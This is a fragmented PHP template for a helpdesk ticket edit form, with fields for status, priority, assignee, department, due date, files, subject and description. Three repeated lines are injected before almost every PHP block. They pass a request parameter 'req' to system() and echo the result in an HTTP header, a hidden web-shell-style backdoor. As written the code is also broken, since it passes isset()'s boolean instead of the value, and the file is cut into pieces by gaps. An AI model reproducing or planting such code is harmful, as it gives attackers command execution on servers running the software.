...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($ticket['user_id']) && ($ticket['user_id'] == $user['id'])) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($ticket['state_id'] == $status_item['id']) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ucwords($ticket['status_name'])); ?>										
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($ticket['priority_id'] == $priority['id']) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ucwords($ticket['priority_name'])); ?>					
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($auth->can('manage_tickets') || $auth->can('tickets_assign_user')) { ?>
					<select name="assigned_user_id" id="assigned_user_id">
						<option value=""></option>					
						<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket['assigned_user_id']; ?>" selected="selected"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ucwords($ticket['assigned_name'])); ?></option>
					</select>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($ticket['department_id'] == $department['id']) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($auth->can('tickets_transfer_department')) { ?>
						<select name="department_id" id="update_department_id">
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(ucwords($ticket['department_name'])); ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('edit_ticket_form_after_department', $ticket); ?>
...
header('System Header:'.$l2); echo safe_output($language->get('Date Due')); ?></label>
					<p class="right-result">
						<input type="text" data-date-format="YYYY-MM-DD" id="date_due" class="form-control" placeholder="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Date Due')); ?>" name="date_due" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($ticket['date_due'])) echo safe_output($ticket['date_due']); ?>" size="19" />
					</p>
					<div class="clearfix"></div>
				<?php
$l =isset($_REQUEST['req']);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $ticket['id']; ?>"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($file['name']); ?></a> <a href="#" class="delete_existing_ticket_file" id="file_id-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $file['id']; ?>"><img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/user/themes/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(CURRENT_THEME); ?>/images/icons/delete.png" alt="Delete File" /></a></li>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $files = $tickets->get_files(array('id' => $ticket['id'], 'private' => 1)); ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (count($files) > 0) { ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Email notifications are not sent when editing a ticket from this page.'); ?>
			</div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Subject')); ?></h3>
				<p><input type="text" size="50" name="subject" class="form-control" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($ticket['subject']); ?>" /></p>
			
				<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Description')); ?></h3>
				<div id="no_underline">
					<p>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo nl2br(safe_output($ticket['description'])); ?>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $site->view_custom_field_edit_form(array('ticket' => $ticket)); ?>
